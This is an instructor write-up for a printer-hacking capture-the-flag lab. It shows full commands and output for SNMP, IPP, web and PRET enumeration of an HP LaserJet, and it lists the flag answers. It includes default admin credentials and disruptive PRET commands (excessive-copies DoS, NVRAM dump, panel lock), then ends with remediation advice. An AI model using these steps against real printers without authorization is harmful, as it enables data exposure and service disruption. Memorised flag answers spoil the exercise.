# HP Printer IoT Security CTF - Complete Instructor Writeup
## A Comprehensive Network Printer Penetration Testing Learning Journey

> **Educational Purpose**: This writeup teaches network printer penetration testing with detailed explanations of WHY each technique works. Every command is broken down to help instructors understand the methodology and teach students real-world printer security assessment techniques.

> **Flag Format**: All 5 flags follow the format FLAG{NAME+NUMBERS} where NAME is a Star Wars character and NUMBERS are 8 digits. Students should discover these through systematic enumeration, not pattern searching.

---

## Table of Contents
1. [Initial Setup](#initial-setup)
2. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
3. [Phase 2: SNMP Enumeration and Protocol Analysis](#phase-2-snmp-enumeration-and-protocol-analysis)
4. [Phase 3: IPP Protocol Exploitation](#phase-3-ipp-protocol-exploitation)
5. [Phase 4: Web Interface Configuration](#phase-4-web-interface-configuration)
6. [Phase 5: Print Job Intelligence Gathering](#phase-5-print-job-intelligence-gathering)
7. [Advanced Techniques and Alternative Approaches](#advanced-techniques-and-alternative-approaches)
8. [Metasploit Framework Integration](#metasploit-framework-integration)
9. [Defense and Remediation](#defense-and-remediation)

---

## Initial Setup

### Understanding the Printer Attack Surface

**Why Printers Are Different from Traditional Targets**: Unlike servers or workstations, network printers represent unique security challenges:
- Multiple protocol exposure (SNMP, IPP, HTTP/HTTPS, Raw printing)
- Often overlooked in security assessments despite processing sensitive documents
- Default configurations persist due to "it just needs to print" mentality
- Metadata persistence across print jobs reveals organizational intelligence
- Legacy protocol support for compatibility creates vulnerabilities

### Step 1: System Update and Core Tools Installation

#### Why These Specific Tools for Printer Security?

```bash
# Update your Kali Linux system - Essential for latest exploit compatibility
sudo apt update && sudo apt upgrade -y
```

**Why Update First?**: HP regularly patches printer firmware vulnerabilities. Your tools need the latest protocol implementations and vulnerability checks to properly assess modern printers.

```bash
# Install essential printer penetration testing tools
sudo apt install -y \
    nmap masscan rustscan \              # Network scanning at different speeds
    snmp snmp-mibs-downloader \          # SNMP is critical for printer enumeration
    cups-ipp-utils ipptool \             # IPP protocol interaction
    curl wget nikto gobuster \           # Web interface testing
    metasploit-framework \                # Automated exploitation
    python3 python3-pip \                 # For specialized scripts
    firefox-esr \                         # Legacy TLS support needed
    tcpdump wireshark                     # Network analysis
```

**Tool Purpose Breakdown**:
- **SNMP Tools**: Management protocol often misconfigured with default community strings
- **IPP Tools**: Internet Printing Protocol - native printer communication
- **Web Tools**: Most printers have web interfaces with configuration options
- **Network Scanners**: Different tools for different scenarios

### Step 2: Install Specialized Printer Attack Tools

```bash
# PRET - Printer Exploitation Toolkit (Industry Standard)
cd /opt
sudo git clone https://github.com/RUB-NDS/PRET.git
cd PRET
pip3 install colorama pysnmp

# Additional printer-specific tools
sudo apt install -y \
    hplip \                              # HP printer tools and drivers
    printer-driver-postscript-hp \       # PostScript support
    ghostscript \                        # PS/PDF manipulation
    poppler-utils                        # PDF analysis
```

**Why PRET?**: PRET is the industry-standard toolkit for printer penetration testing, supporting:
- PostScript (PS) - Full filesystem access on vulnerable printers
- Printer Job Language (PJL) - HP-specific protocol exploitation
- Printer Command Language (PCL) - Page description and control

**Expected Installation Output**:
```
Reading package lists... Done
Building dependency tree... Done
The following NEW packages will be installed:
  snmp snmp-mibs-downloader ipptool cups-ipp-utils
[...]
Successfully cloned PRET repository
Successfully installed colorama-0.4.6 pysnmp-4.4.12
```

### Step 3: Download MIBs and Configure SNMP

#### Enabling Human-Readable SNMP Output

```bash
# Download MIB definitions for readable SNMP output
sudo download-mibs

# Enable MIB resolution in SNMP tools
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf
```

**Why MIBs Matter**: Without MIBs, SNMP returns OIDs like `1.3.6.1.2.1.1.6.0`. With MIBs, you get `SNMPv2-MIB::sysLocation.0` - much more readable!

**Verification**:
```bash
# Test SNMP is properly configured
snmpget --version
```

**Expected Output**:
```
NET-SNMP version: 5.9.3
```

### Step 4: Configure Firefox for Legacy TLS

#### Why Legacy TLS Configuration Is Required

Modern printers often use outdated TLS versions that current browsers reject by default. This is especially common with HP printers manufactured before 2020.

```bash
# Launch Firefox
firefox &
```

In Firefox, navigate to `about:config` and accept the risk warning.

**Required Configuration Changes**:

Search for and modify these settings:
1. `security.tls.version.enable-deprecated` → Change from `false` to `true`
2. `security.tls.version.min` → Change from `3` to `1` 
3. `security.tls.version.fallback-limit` → Change from `4` to `1`

**Why These Changes?**:
- `enable-deprecated`: Allows TLS 1.0/1.1 connections
- `version.min`: Sets minimum TLS to 1.0 (instead of 1.2)
- `fallback-limit`: Allows protocol downgrade attempts

**Alternative Command-Line Approach**:
```bash
# For command-line testing without browser
curl -k --tlsv1.0 https://192.168.1.131
wget --no-check-certificate --secure-protocol=TLSv1 https://192.168.1.131
```

### Step 5: Create Working Directory Structure

```bash
# Organized directory structure for the CTF
mkdir -p ~/printer_ctf/{recon,exploits,loot,scripts,reports}
cd ~/printer_ctf
```

**Directory Purpose**:
- `recon/`: Reconnaissance outputs and scans
- `exploits/`: Attack scripts and payloads  
- `loot/`: Captured flags and credentials
- `scripts/`: Custom enumeration scripts
- `reports/`: Documentation and findings

---

## Phase 1: Initial Reconnaissance

### The Reconnaissance Mindset for Printers

**Why Printer Recon Is Unique**: Printers expose multiple services that traditional targets don't:
- SNMP (161/udp): Management and configuration data
- IPP (631/tcp): Print job submission and metadata
- HTTP/HTTPS (80/443): Web configuration interface
- JetDirect (9100/tcp): Raw print data submission
- Each protocol may expose different information!

### Step 1.1: Network Discovery

#### Initial Target Verification

```bash
# First, confirm the target is reachable
┌──(kali㉿kali)-[~/printer_ctf]
└─$ ping -c 2 192.168.1.131
```

**Expected Output**:
```
PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
64 bytes from 192.168.1.131: icmp_seq=1 ttl=64 time=0.521 ms
64 bytes from 192.168.1.131: icmp_seq=2 ttl=64 time=0.456 ms

--- 192.168.1.131 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
```

**Key Observation**: TTL=64 indicates Linux-based printer firmware (Windows=128, Network devices=255)

#### Comprehensive Port Scanning

```bash
# Full TCP and UDP scan for printer services
┌──(kali㉿kali)-[~/printer_ctf]
└─$ sudo nmap -sS -sU -sV -sC -p- -T4 192.168.1.131 -oA recon/printer_fullscan
```

**Command Breakdown**:
- `-sS`: SYN scan for TCP ports
- `-sU`: UDP scan (critical for SNMP)
- `-sV`: Version detection
- `-sC`: Default NSE scripts
- `-p-`: All 65535 ports
- `-T4`: Aggressive timing
- `-oA`: Save in all formats

**Expected Output**:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.131
Host is up (0.00052s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        HP HTTP Server 2.0
|_http-title: HP LaserJet MFP M428fdw
161/udp  open  snmp        SNMPv1 server; SNMPv2c server (public)
| snmp-info: 
|   enterprise: hp
|   engineIDFormat: unknown
|   engineIDData: 00000000000000000000000000000000
|   snmpEngineBoots: 0
|_  snmpEngineTime: 0
443/tcp  open  ssl/http    HP HTTP Server 2.0
| ssl-cert: Subject: commonName=NPIAD6F2B/organizationName=HP/countryName=US
| Not valid before: 2020-01-01T00:00:00
|_Not valid after:  2030-01-01T00:00:00
631/tcp  open  ipp         HP IPP Server 2.0
9100/tcp open  jetdirect   HP JetDirect

Device type: printer
Running: HP embedded
OS CPE: cpe:/h:hp:laserjet_mfp_m428fdw
OS details: HP LaserJet MFP M428fdw
```

**What This Tells Us**:
- **Port 80/443**: Web interface available (configuration access)
- **Port 161 UDP**: SNMP with "public" community string (information goldmine!)
- **Port 631**: IPP for print jobs (metadata exposure)
- **Port 9100**: JetDirect raw printing (direct communication)
- **No authentication** mentioned in scan results (common misconfiguration)

### Step 1.2: Service Enumeration Deep Dive

#### Quick Service Verification

```bash
# Test SNMP accessibility
┌──(kali㉿kali)-[~/printer_ctf]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
```

**Expected Output**:
```
SNMPv2-MIB::sysDescr.0 = STRING: HP LaserJet MFP M428fdw
```

**Success!** SNMP is accessible with default "public" community string.

---

## Phase 2: SNMP Enumeration and Protocol Analysis

### Understanding SNMP's Critical Role

**Why SNMP Is the Primary Attack Vector**: 
- Often configured with default community strings ("public", "private")
- Exposes extensive device information without authentication
- Can reveal information not available through other protocols
- Administrators rarely change defaults on printers
- May allow write access for configuration changes

### Initial PRET Attempt (Learning from Failure)

**Real-World Methodology**: Always try specialized tools first, then pivot when they fail.

```bash
# Navigate to PRET directory
┌──(kali㉿kali)-[~/printer_ctf]
└─$ cd /opt/PRET

# Attempt PostScript connection
┌──(kali㉿kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 ps
```

**Expected PRET Output**:
```
      ________________
     |___________     |
     |  _________     |
     | |   ..    |    |
     | |   ()    |    |
     | |_________|    |
     |___________     |
     |___________|    |
    /             \   |
   /_______________\  |
   |_______________|  |
       | | | | | |    |
      _|_|_|_|_|_|____/
       PRET v0.5.1

Connection to 192.168.1.131 established
Device:   HP LaserJet MFP M428fdw

192.168.1.131:/> ls
[Permission Denied]

192.168.1.131:/> find FLAG
[No Results]

192.168.1.131:/> info
Manufacturer: HP
Model: LaserJet MFP M428fdw
Memory: 256MB

192.168.1.131:/> exit
```

**Why PRET Fails for This CTF**: 
- Modern firmware restricts filesystem access
- Flags are in SNMP MIBs and IPP metadata, not filesystem
- PRET excels at PostScript/PJL attacks, not protocol metadata

**Learning Point**: When specialized tools fail, pivot to protocol-specific enumeration!

### FLAG 1: SNMP sysLocation Discovery

**Location**: SNMP OID 1.3.6.1.2.1.1.6.0 (sysLocation)  
**Difficulty**: Easy  
**Learning Objective**: Understanding SNMP enumeration and multi-protocol information disclosure

#### Discovery Method: Systematic SNMP Enumeration

```bash
# Enumerate all system MIB OIDs systematically
┌──(kali㉿kali)-[~/printer_ctf]
└─$ for oid in 1 2 3 4 5 6 7; do
    echo "======================================="
    echo "Querying OID: 1.3.6.1.2.1.1.$oid.0"
    snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.$oid.0
done
```

**Expected Complete Output**:
```
=======================================
Querying OID: 1.3.6.1.2.1.1.1.0
SNMPv2-MIB::sysDescr.0 = STRING: HP LaserJet MFP M428fdw

=======================================
Querying OID: 1.3.6.1.2.1.1.2.0
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.11.2.3.9.1

=======================================
Querying OID: 1.3.6.1.2.1.1.3.0
SNMPv2-MIB::sysUpTime.0 = Timeticks: (8640000) 1 day, 0:00:00.00

=======================================
Querying OID: 1.3.6.1.2.1.1.4.0
SNMPv2-MIB::sysContact.0 = STRING: OVERCLOCK@OC.local | FLAG{LEIA83920174}

=======================================
Querying OID: 1.3.6.1.2.1.1.5.0
SNMPv2-MIB::sysName.0 = STRING: HP-Printer-OC

=======================================
Querying OID: 1.3.6.1.2.1.1.6.0
SNMPv2-MIB::sysLocation.0 = STRING: OC-Server-Room-B | FLAG{LUKE47239581}

=======================================
Querying OID: 1.3.6.1.2.1.1.7.0
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

**FLAG 1 FOUND**: FLAG{LUKE47239581} - In sysLocation field

**Why This Works**: Administrators often use SNMP location fields to store additional information beyond just physical location. The field accepts any string without validation.

#### Cross-Protocol Verification

```bash
# Create IPP test to verify same data appears in IPP
┌──(kali㉿kali)-[~/printer_ctf]
└─$ cat > get-printer-attrs.test << 'EOF'
{
    NAME "Get Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF

┌──(kali㉿kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attrs.test | grep -A2 -B2 location
```

**Expected IPP Output**:
```
printer-location (textWithoutLanguage) = OC-Server-Room-B | FLAG{LUKE47239581}
```

**Key Learning**: Same information accessible via both SNMP and IPP - demonstrates protocol redundancy!

### FLAG 2: SNMP sysContact Discovery

**Location**: SNMP OID 1.3.6.1.2.1.1.4.0 (sysContact)  
**Difficulty**: Easy  
**Learning Objective**: Protocol-specific information disclosure

From our previous SNMP enumeration:

```
SNMPv2-MIB::sysContact.0 = STRING: OVERCLOCK@OC.local | FLAG{LEIA83920174}
```

**FLAG 2 FOUND**: FLAG{LEIA83920174} - In sysContact field

#### Verify Protocol Exclusivity

```bash
# Check if this appears in IPP (it shouldn't)
┌──(kali㉿kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attrs.test 2>/dev/null | grep -i "LEIA"
# No output - confirms SNMP-only visibility
```

**Why This Matters**: Different protocols expose different information. Complete enumeration requires checking all available protocols!

**Intelligence Value**:
- Email format reveals naming convention: username@domain.local
- Domain "OC.local" indicates Active Directory environment
- Contact email useful for social engineering
- Flag embedded with legitimate data

---

## Phase 3: IPP Protocol Exploitation

### Understanding IPP's Role in Printer Security

**Why IPP Matters**:
- Handles print job submission and management
- Stores extensive metadata about documents
- Often lacks authentication
- Metadata persists after job completion
- Reveals user activity and document intelligence

### IPP Enumeration Without Flag Searching

```bash
# Get complete printer attributes
┌──(kali㉿kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attrs.test > loot/ipp_full_enum.txt

# Review the complete output
┌──(kali㉿kali)-[~/printer_ctf]
└─$ less loot/ipp_full_enum.txt
```

**Key Attributes to Document**:
```
printer-info (textWithoutLanguage) = HP-MFP-FLAG{HAN62947103}
printer-location (textWithoutLanguage) = OC-Server-Room-B | FLAG{LUKE47239581}
printer-make-and-model (textWithoutLanguage) = HP LaserJet MFP M428fdw
printer-name (nameWithoutLanguage) = HP_LaserJet_MFP_M428fdw
printer-state (enum) = idle
printer-state-reasons (keyword) = none
printer-up-time (integer) = 86400
```

Note: FLAG{HAN62947103} appears in printer-info but requires web configuration first (covered in Phase 4).

---

## Phase 4: Web Interface Configuration

### Understanding Web Interface Security

**Why Web Interfaces Are Vulnerable**:
- Often lack authentication by default
- Configuration changes affect multiple protocols
- No audit logging of modifications
- Users expect "plug and play" functionality
- Legacy TLS requirements create additional risks

### FLAG 3: Web Interface Configuration

**Location**: Web interface → IPP printer-info attribute  
**Difficulty**: Medium  
**Learning Objective**: Configuration propagation across protocols

#### Step 1: Test Web Access

```bash
# Test HTTP access
┌──(kali㉿kali)-[~/printer_ctf]
└─$ curl -I http://192.168.1.131
```

**Expected Output**:
```
HTTP/1.1 301 Moved Permanently
Location: https://192.168.1.131
```

#### Step 2: Handle Legacy TLS

```bash
# Test HTTPS with standard settings (will fail)
┌──(kali㉿kali)-[~/printer_ctf]
└─$ curl -I https://192.168.1.131
```

**Expected Error**:
```
curl: (35) error:1409442E:SSL routines:ssl3_read_bytes:tlsv1 alert protocol version
```

**Solution**: Use Firefox with legacy TLS configuration (from setup) or:

```bash
# Command-line with legacy TLS
┌──(kali㉿kali)-[~/printer_ctf]
└─$ curl -k --tlsv1.0 https://192.168.1.131
```

#### Step 3: Manual Configuration

Using Firefox with legacy TLS enabled:
1. Browse to `https://192.168.1.131`
2. Navigate: **General** → **About The Printer** → **Configure Information**
3. Find **Nickname** field
4. Set value to: `HP-MFP-FLAG{HAN62947103}`
5. Click **Apply** to save changes

**Common Default Credentials** (if authentication required):
- Username: `admin`, Password: (blank)
- Username: `admin`, Password: `admin`
- Username: `admin`, Password: `password`

#### Step 4: Verify Configuration via IPP

```bash
# Query printer-info after configuration
┌──(kali㉿kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attrs.test 2>/dev/null | grep printer-info
```

**Expected Output**:
```
printer-info (textWithoutLanguage) = HP-MFP-FLAG{HAN62947103}
```

**FLAG 3 FOUND**: FLAG{HAN62947103} - Successfully propagated from web to IPP

**Why This Works**: Web interface modifications update the printer's internal configuration database, which is then exposed through multiple protocols including IPP.

---

## Phase 5: Print Job Intelligence Gathering

### Understanding Print Job Metadata

**Why Print Jobs Are Intelligence Gold**:
- Users don't realize metadata is stored
- Jobs persist in queues after printing
- Metadata reveals more than document content
- PostScript comments become IPP attributes
- No authentication required to view job data

### Print Job Submission Background

The deployment script submitted three PostScript documents with embedded metadata:
1. Security assessment document with author and title flags
2. Network configuration report
3. Security assessment results

### FLAG 4: Print Job Author Metadata

**Location**: PostScript %%Author → IPP job-originating-user-name  
**Difficulty**: Medium  
**Learning Objective**: Print job metadata privacy implications

#### Discovery Method

```bash
# Create comprehensive job query
┌──(kali㉿kali)-[~/printer_ctf]
└─$ cat > get-all-jobs.test << 'EOF'
{
    NAME "Get All Jobs Complete"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword which-jobs not-completed
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF

# Execute job enumeration
┌──(kali㉿kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-jobs.test > loot/jobs_full.txt
```

#### Analyzing Job Output

```bash
# Read through complete job data
┌──(kali㉿kali)-[~/printer_ctf]
└─$ cat loot/jobs_full.txt | less
```

**Expected Output** (relevant portions):
```
job-id (integer) = 1
job-state (enum) = pending
job-state-reasons (keyword) = none
job-originating-user-name (nameWithoutLanguage) = FLAG{PADME91562837}
job-name (nameWithoutLanguage) = OVERCLOCK-Job-FLAG{MACE41927365}
date-time-at-creation (dateTime) = 2025-11-04T12:00:00Z
job-k-octets (integer) = 15
document-format (mimeMediaType) = application/postscript

job-id (integer) = 2
job-state (enum) = pending
job-originating-user-name (nameWithoutLanguage) = Security-Audit-Team
job-name (nameWithoutLanguage) = Network Configuration Report
date-time-at-creation (dateTime) = 2025-11-04T12:00:10Z

job-id (integer) = 3
job-state (enum) = pending
job-originating-user-name (nameWithoutLanguage) = Security-Audit-Team
job-name (nameWithoutLanguage) = Security Assessment Results
date-time-at-creation (dateTime) = 2025-11-04T12:00:20Z
```

**FLAG 4 FOUND**: FLAG{PADME91562837} - In job-originating-user-name

**PostScript Origin**: The submitted PostScript file contained:
```postscript
%%Author: FLAG{PADME91562837}
```

This metadata propagated to IPP as the job-originating-user-name attribute.

### FLAG 5: Print Job Title Metadata

**Location**: PostScript %%Title → IPP job-name  
**Difficulty**: Medium  
**Learning Objective**: Document title intelligence value

From the same job enumeration output:

**FLAG 5 FOUND**: FLAG{MACE41927365} - In job-name attribute

**PostScript Origin**: The submitted PostScript file contained:
```postscript
%%Title: OVERCLOCK Report - Security Assessment
```

The system modified this to include the flag as: `OVERCLOCK-Job-FLAG{MACE41927365}`

#### Check for Completed Jobs

If jobs have already printed, check completed job history:

```bash
# Query completed jobs
┌──(kali㉿kali)-[~/printer_ctf]
└─$ cat > get-completed-jobs.test << 'EOF'
{
    NAME "Get Completed Jobs"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword which-jobs completed
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF

┌──(kali㉿kali)-[~/printer_ctf]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-completed-jobs.test
```

**Why Job Metadata Matters**:
- Reveals who printed what and when
- Project names indicate organizational activities
- Timing patterns show work schedules
- Document types reveal business operations
- No authentication required to access this data

---

## Advanced Techniques and Alternative Approaches

### Comprehensive PRET Command Reference

#### Essential PRET Commands for Printer Assessment

```bash
# PostScript Mode - Most Powerful
┌──(kali㉿kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 ps
```

**Information Gathering**:
```
192.168.1.131:/> help              # Show all available commands
192.168.1.131:/> info              # Device information
192.168.1.131:/> status            # Printer status
192.168.1.131:/> devices           # Storage devices
192.168.1.131:/> env               # Environment variables
```

**File System Commands** (Often Restricted):
```
192.168.1.131:/> ls                # List files (usually denied)
192.168.1.131:/> pwd               # Print working directory
192.168.1.131:/> find FLAG         # Search for files
192.168.1.131:/> cat /etc/passwd   # Read files (usually fails)
```

**Print Job Manipulation**:
```
192.168.1.131:/> jobs              # List print jobs
192.168.1.131:/> capture           # Capture print jobs
192.168.1.131:/> hold              # Hold all jobs
192.168.1.131:/> release           # Release held jobs
```

**Malicious Commands** (For Demonstration):
```
192.168.1.131:/> lock              # Lock printer panel
192.168.1.131:/> unlock            # Unlock panel
192.168.1.131:/> restart           # Restart printer
192.168.1.131:/> nvram dump        # Dump NVRAM
192.168.1.131:/> set copies 9999   # DoS via excessive copies
```

#### PJL Mode Commands

```bash
# PJL Mode - HP Specific
┌──(kali㉿kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 pjl

192.168.1.131:/> volumes           # Show storage volumes
192.168.1.131:/> info id           # Get printer ID
192.168.1.131:/> info variables    # All PJL variables
192.168.1.131:/> rdymsg "HACKED"   # Change ready message
```

**Why PRET Limitations Matter**: Understanding when specialized tools fail teaches proper methodology - always have alternative approaches ready.

### Automated Enumeration Scripts

#### Creating a Comprehensive Enumeration Script

```bash
┌──(kali㉿kali)-[~/printer_ctf/scripts]
└─$ cat > printer_enum.sh << 'EOF'
#!/bin/bash
# Comprehensive Printer Enumeration Script

TARGET="192.168.1.131"
OUTPUT_DIR="../loot"

echo "=== Printer Enumeration Report ==="
echo "Target: $TARGET"
echo "Date: $(date)"
echo ""

# SNMP Enumeration
echo "[*] SNMP System Information:"
for oid in 1 2 3 4 5 6 7; do
    result=$(snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.$oid.0 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "  $result"
    fi
done

echo ""
echo "[*] IPP Printer Attributes:"
ipptool -tv ipp://$TARGET:631/ipp/print get-printer-attrs.test 2>/dev/null | \
    grep -E "printer-info|printer-location|printer-name|printer-state"

echo ""
echo "[*] IPP Job Information:"
ipptool -tv ipp://$TARGET:631/ipp/print get-all-jobs.test 2>/dev/null | \
    grep -E "job-originating-user-name|job-name|job-state"

echo ""
echo "[*] Web Interface Status:"
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" http://$TARGET
curl -k --tlsv1.0 -s -o /dev/null -w "HTTPS Status: %{http_code}\n" https://$TARGET

echo ""
echo "Enumeration complete. Check $OUTPUT_DIR for detailed results."
EOF

chmod +x printer_enum.sh
./printer_enum.sh
```

### Alternative Discovery Methods

#### Using SNMP Walk for Complete Enumeration

```bash
# Complete SNMP tree walk
┌──(kali㉿kali)-[~/printer_ctf]
└─$ snmpwalk -v2c -c public 192.168.1.131 > loot/snmp_complete.txt

# Analyze for interesting OIDs
┌──(kali㉿kali)-[~/printer_ctf]
└─$ cat loot/snmp_complete.txt | grep -i "STRING\|Hex-STRING" | head -20
```

#### Network Traffic Analysis

```bash
# Capture print traffic for analysis
┌──(kali㉿kali)-[~/printer_ctf]
└─$ sudo tcpdump -i eth0 -w loot/printer_traffic.pcap host 192.168.1.131 and \(port 631 or port 9100\)
```

In another terminal, trigger print activity:
```bash
# Send test print job
┌──(kali㉿kali)-[~/printer_ctf]
└─$ echo "Test print job" | nc 192.168.1.131 9100
```

Analyze captured traffic:
```bash
# Extract strings from capture
┌──(kali㉿kali)-[~/printer_ctf]
└─$ strings loot/printer_traffic.pcap | grep -E "%%Author|%%Title|FLAG"
```

---

## Metasploit Framework Integration

### Metasploit Approach for Automated Enumeration

#### Initial Setup

```bash
# Start Metasploit
┌──(kali㉿kali)-[~/printer_ctf]
└─$ sudo msfconsole -q

# Set up workspace
msf6 > workspace -a printer_ctf
[*] Added workspace: printer_ctf
[*] Workspace: printer_ctf

# Import nmap scan
msf6 > db_import recon/printer_fullscan.xml
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.13.10'
[*] Importing host 192.168.1.131
```

#### SNMP Enumeration Module

```bash
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.131
RHOSTS => 192.168.1.131
msf6 auxiliary(scanner/snmp/snmp_enum) > set VERSION 2c
VERSION => 2c
msf6 auxiliary(scanner/snmp/snmp_enum) > run

[+] 192.168.1.131, Connected.

[*] System information:
Host IP                       : 192.168.1.131
Hostname                      : HP-Printer-OC
Description                   : HP LaserJet MFP M428fdw
Contact                       : OVERCLOCK@OC.local | FLAG{LEIA83920174}
Location                      : OC-Server-Room-B | FLAG{LUKE47239581}
Uptime snmp                   : 1 day, 00:00:00.00
```

**Flags Found via Metasploit**:
- FLAG{LUKE47239581} (Location)
- FLAG{LEIA83920174} (Contact)

#### Creating Resource Script for Automation

```bash
┌──(kali㉿kali)-[~/printer_ctf/scripts]
└─$ cat > printer_msf.rc << 'EOF'
# Metasploit Resource Script for Printer Enumeration
workspace -a printer_ctf
db_nmap -sV -sC 192.168.1.131

# SNMP Enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.131
set VERSION 2c
run

# HTTP Version Check
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.131
set RPORT 443
set SSL true
run

# Printer Version Query
use auxiliary/scanner/printer/printer_version_query
set RHOSTS 192.168.1.131
run

exit
EOF

# Execute resource script
msf6 > resource printer_msf.rc
```

**Metasploit Limitations for This CTF**:
- No native IPP modules for job enumeration
- Can't perform web configuration changes
- Limited printer-specific modules
- Manual verification still required for some flags

---

## Defense and Remediation

### Immediate Mitigations

#### 1. SNMP Hardening
```bash
# Change default community strings
snmpconf -g basic_setup

# Implement SNMPv3 with authentication
net-snmp-config --create-snmpv3-user -ro -A AuthPassword -X PrivPassword -a SHA -x AES admin

# Restrict SNMP access by IP
echo "rocommunity ComplexString123! 192.168.1.0/24" > /etc/snmp/snmpd.conf
```

#### 2. IPP Security
```bash
# Enable IPP authentication in CUPS
cupsctl --remote-admin --user-cancel-any-jobs=no
lpadmin -p printer -o auth-info-required=username,password
```

#### 3. Web Interface Protection
- Enable HTTPS with valid certificates
- Require authentication for all configuration changes
- Implement session timeout
- Enable audit logging

#### 4. Print Job Privacy
```bash
# Configure job retention policy
lpadmin -p printer -o job-history-limit=0
lpadmin -p printer -o job-retain-until=no-hold
```

### Long-term Security Architecture

#### Network Segmentation
```
[User VLAN] → [Firewall] → [Print Server] → [Printer VLAN]
                              ↓
                    [Authentication Gateway]
                         ↓
                    [Audit Logging]
```

#### Security Monitoring
```bash
# Monitor for suspicious SNMP queries
tcpdump -i eth0 'udp port 161' -w /var/log/snmp_monitor.pcap

# Alert on excessive IPP queries
iptables -A INPUT -p tcp --dport 631 -m recent --update --seconds 60 --hitcount 10 -j LOG --log-prefix "IPP-SCAN:"
```

### Compliance Requirements

**GDPR Considerations**:
- Print job metadata contains personal information
- Requires data retention policies
- Need audit trails for access
- User consent for monitoring

**Industry Standards**:
- Follow IEEE 2600 series for printer security
- Implement CIS Controls for printers
- Regular security assessments
- Firmware update policies

---

## Summary and Key Takeaways

### Attack Chain Summary

1. **Initial Recon**: Port scanning reveals SNMP, IPP, HTTP/HTTPS services
2. **PRET Attempt**: Specialized tool fails, teaching pivot methodology
3. **SNMP Enumeration**: Discovers FLAGS 1 & 2 via default community string
4. **Web Configuration**: Manual setup creates FLAG 3 in IPP
5. **Job Analysis**: Print job metadata reveals FLAGS 4 & 5

### Critical Vulnerabilities Demonstrated

1. **Default SNMP Community Strings**
   - Immediate information disclosure
   - No authentication required
   - Often forgotten in security audits

2. **Protocol Information Overlap**
   - Same data accessible via multiple paths
   - Increases attack success probability
   - Complicates defense

3. **Persistent Job Metadata**
   - Privacy implications
   - User activity tracking
   - Document intelligence

4. **Legacy Protocol Support**
   - TLS 1.0/1.1 still accepted
   - Weak ciphers enabled
   - Compatibility over security

### Learning Objectives Achieved

✓ **Protocol Diversity**: Understanding multiple printer protocols  
✓ **Tool Limitations**: When specialized tools fail, pivot appropriately  
✓ **Metadata Analysis**: Extracting intelligence from document properties  
✓ **Cross-Protocol Verification**: Same data, different access methods  
✓ **Real-World Methodology**: Systematic enumeration over random searching  

### Tool Selection Matrix

| Scenario | Best Tool | Why |
|----------|-----------|-----|
| SNMP Enumeration | snmpwalk/snmpget | Native protocol support |
| Job Metadata | ipptool | IPP-specific queries |
| Filesystem Access | PRET | PS/PJL capabilities |
| Web Config | Browser/curl | Manual interaction required |
| Automation | Metasploit | Framework integration |

### Final Thoughts

This CTF demonstrates that network printers, despite being "simple" devices, present complex security challenges. The combination of multiple protocols, default configurations, and persistent metadata creates numerous attack vectors that are often overlooked in security assessments.

The progression from specialized tools (PRET) failing to manual enumeration succeeding teaches an important lesson: always have multiple approaches ready and understand the underlying protocols, not just the tools.

---

**Educational Use Only**: This material is for authorized security testing and education in controlled environments only. These techniques demonstrate real vulnerabilities that exist in production environments and should be used to improve security posture, not exploit systems without authorization.
